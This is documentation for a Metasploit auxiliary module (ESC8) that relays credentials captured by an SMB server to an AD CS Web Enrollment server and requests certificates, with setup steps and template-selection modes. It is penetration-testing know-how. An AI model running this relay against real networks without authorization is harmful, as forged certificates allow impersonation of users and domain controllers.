## Vulnerable Application
This module creates an SMB server and then relays the credentials passed to it
to an HTTP server to gain an authenticated connection.  Once that connection is
established, the module makes an authenticated request for a certificate based
on a given template.

## Verification Steps

1. Install and configure the application
    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/overview.html#setting-up-a-esc8-vulnerable-host
2. Start `msfconsole`
2. Do: `use auxiliary/server/relay/esc8`
3. Set the `RHOSTS` option to the AD CS Web Enrollment server
4. Run the module and wait for a request to be relayed

## Options

### MODE
The issue mode. This controls what the module will do once an authenticated session is established to the Web Enrollment
server. Must be one of the following options:

* ALL: Enumerate all available certificate templates and then issue each of them
* AUTO: Automatically select either the `User` or `DomainController` and `Machine` (`Computer`) templates to issue
  based on if the authenticated user is a user or machine account. The determination is based on checking for a `$` 
  at the end of the name, which means that it is a machine account.
* QUERY_ONLY: Enumerate all available certificate templates but do not issue any.  Not all certificate templates
  available for use will be displayed; templates with the flag CT_FLAG_MACHINE_TYPE set will not show available and 
  include `Machine` (AKA `Computer`) and `DomainController`  
* SPECIFIC_TEMPLATE: Issue the certificate template specified in the `CERT_TEMPLATE` option

### CERT_TEMPLATE
The template to issue if MODE is SPECIFIC_TEMPLATE.
